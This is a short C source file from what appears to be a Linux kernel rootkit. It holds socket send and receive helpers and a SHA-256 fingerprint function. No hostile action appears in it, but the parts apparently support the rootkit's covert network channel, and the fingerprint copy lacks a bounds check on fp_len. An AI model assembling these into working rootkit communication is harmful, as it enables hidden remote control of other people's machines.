// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"

int rk_send(struct socket *sock, const void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

int rk_recv(struct socket *sock, void *buf, size_t len)
{
	struct msghdr msg = { 0 };
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(sock, &msg, &vec, 1, len, 0);
}

int rk_compute_fingerprint(const u8 *key, size_t key_len,
			   u8 *fp, size_t fp_len)
{
	struct crypto_shash *tfm;
	struct shash_desc *desc;
	u8 digest[32];
	int error;

	tfm = crypto_alloc_shash("sha256", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);

	desc = kzalloc(sizeof(*desc) + crypto_shash_descsize(tfm),
		       GFP_KERNEL);
	if (!desc) {
		crypto_free_shash(tfm);
		return -ENOMEM;
	}

	desc->tfm = tfm;
	error = crypto_shash_digest(desc, key, key_len, digest);
	if (!error)
		memcpy(fp, digest, fp_len);

	memzero_explicit(digest, sizeof(digest));
	kfree(desc);
	crypto_free_shash(tfm);
	return error;
}
